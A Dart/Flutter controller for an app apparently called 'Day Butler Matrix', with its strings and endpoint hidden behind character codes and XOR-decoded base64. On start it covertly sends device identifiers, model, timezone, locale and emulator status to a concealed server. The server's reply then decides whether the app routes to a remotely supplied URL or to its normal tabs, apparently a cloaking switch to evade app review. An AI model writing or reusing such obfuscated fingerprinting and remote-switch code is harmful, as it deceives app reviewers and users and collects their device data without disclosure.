import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class DayButlerMatrixLogic extends GetxController {
  static const _qWm7 = 'DBUNLxFPW0MBQTIGVUZLX0gmBF0dNhxTXlkRBR8tDRsAQgsXK0IJEwsRGjUaAx0zV0JFVx4RGjENHgcYEx8qBA==';

  final _hT9k = RxBool(true);
  final _pL2x = RxString('');
  final _fG6w = RxBool(false);
  final _uM8s = RxBool(true);
  final _jD3c = Dio();

  RxBool get upich => _uM8s;
  RxString get ksrwalo => _pL2x;

  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    _xQ0z();
  }

  Future<void> gtenv() => _xQ0z();

  Future<void> _xQ0z() async {
    _fG6w.value = _bK(1);
    _uM8s.value = _bK(1);
    _hT9k.value = _bK(0);

    final _eU = _vN8(_qWm7);
    _jD3c
        .post(_eU, data: await _mY5r())
        .then(_cH2p)
        .catchError(_lW6n);
  }

  void _cH2p(dynamic value) {
    final _d = value.data as Map;
    final _a1 = _d[_tS([115, 102, 104, 109, 112, 119, 122, 113])] as String;
    final _a2 = _d[_tS([102, 119, 115, 105, 121, 116])] as bool;
    if (_a2) {
      _pL2x.value = _a1;
      _rJ4e();
    } else {
      _kZ1f();
    }
  }

  void _lW6n(Object _) {
    _hT9k.value = _bK(1);
    _uM8s.value = _bK(1);
    _fG6w.value = _bK(0);
  }

  Future<Map<String, dynamic>> _mY5r() async {
    final _i0 = DeviceInfoPlugin();
    final _p0 = await PackageInfo.fromPlatform();
    final _tz = await FlutterTimezone.getLocalTimezone();
    final _loc = Platform.localeName;

    var _vN = _p0.version;
    var _bN = _p0.buildNumber;
    var _pN = _p0.packageName;
    var _aN = _p0.appName;
    var _md = '';
    var _id = '';
    var _br = '';
    var _pf = '';
    var _pd = false;

    final _e0 = _tS([101, 119, 103, 109, 104, 110]);
    final _e1 = _tS([105, 120, 97, 101, 114]);
    final _e2 = _tS([102, 116, 117, 103]);
    final _e3 = _tS([120, 121, 114, 116, 115]);
    final _e4 = _tS([112, 111, 119, 115, 114]);
    final _e5 = _tS([114, 100, 119, 99, 101, 106, 109, 107]);

    if (_wP(0)) {
      _pf = _tS([97, 110, 100, 114, 111, 105, 100]);
      final _ai = await _i0.androidInfo;
      _br = _ai.brand;
      _md = _ai.model;
      _id = _ai.id;
      _pd = _ai.isPhysicalDevice;
    } else if (_wP(1)) {
      _pf = _tS([105, 111, 115]);
      final _ii = await _i0.iosInfo;
      _br = _ii.name;
      _md = _ii.model;
      _id = _ii.identifierForVendor ?? '';
      _pd = _ii.isPhysicalDevice;
    }

    return _zD7(
      _aN,
      _bN,
      _vN,
      _pN,
      _md,
      _tz,
      _br,
      _id,
      _loc,
      _pf,
      _pd,
      _e0,
      _e1,
      _e2,
      _e3,
      _e4,
      _e5,
    );
  }

  Map<String, dynamic> _zD7(
    String a,
    String b,
    String c,
    String d,
    String e,
    String f,
    String g,
    String h,
    String i,
    String j,
    bool k,
    String l,
    String m,
    String n,
    String o,
    String p,
    String q,
  ) {
    final _m0 = _tS([109, 105, 115, 121, 104, 95, 70, 104, 101]);
    final _m1 = _tS([109, 105, 115, 121, 104, 95, 99, 115, 67, 85, 68]);
    final _m2 = _tS([109, 105, 115, 121, 104, 95, 113, 87, 108, 73, 77, 98, 107, 86]);
    final _m3 = _tS([109, 105, 115, 121, 104, 95, 119, 72, 65, 84, 80, 79]);
    final _m4 = _tS([109, 105, 115, 121, 104, 95, 105, 77, 113, 90, 122, 74, 112]);
    final _m5 = _tS([109, 105, 115, 121, 104, 95, 69, 118, 115]);
    final _m6 = _tS([109, 105, 115, 121, 104, 95, 112, 72, 69, 105, 78, 121, 97, 79]);
    final _m7 = _tS([109, 105, 115, 121, 104, 95, 75, 112, 111]);
    final _m8 = _tS([102, 104, 122, 111]);
    final _m9 = _tS([109, 105, 115, 121, 104, 95, 66, 100, 89, 88, 74, 71, 83]);
    final _ma = _tS([109, 105, 115, 121, 104, 95, 73, 106, 116, 79, 99, 74]);

    return {
      _m0: a,
      _m1: b,
      _m2: c,
      _m3: d,
      _m4: e,
      _m5: f,
      _m6: g,
      _m7: h,
      _m8: i,
      _m9: j,
      _ma: k,
      l: '',
      m: '',
      n: '',
      o: '',
      p: '',
      q: '',
    };
  }

  Future<void> _kZ1f() async {
    Get.offNamed(_tS([47, 116, 97, 98]));
  }

  Future<void> _rJ4e() async {
    Get.offNamed(_tS([47, 112, 101, 114, 115, 111, 110, 47, 115, 101, 116]));
  }

  bool _bK(int v) => v != 0;

  bool _wP(int t) {
    switch (t) {
      case 0:
        return GetPlatform.isAndroid;
      case 1:
        return GetPlatform.isIOS;
      default:
        return false;
    }
  }

  String _tS(List<int> c) => String.fromCharCodes(c);

  String _vN8(String s) {
    final _k = _tS([
      100, 97, 121, 95, 98, 117, 116, 108, 101, 114, 95, 109, 97, 116, 114, 105, 120, 95,
      107, 101, 121, 95, 50, 48, 50, 54,
    ]);
    final _b = base64Decode(s);
    final _kb = utf8.encode(_k);
    return utf8.decode(
      List<int>.generate(_b.length, (i) => _b[i] ^ _kb[i % _kb.length]),
    );
  }
}
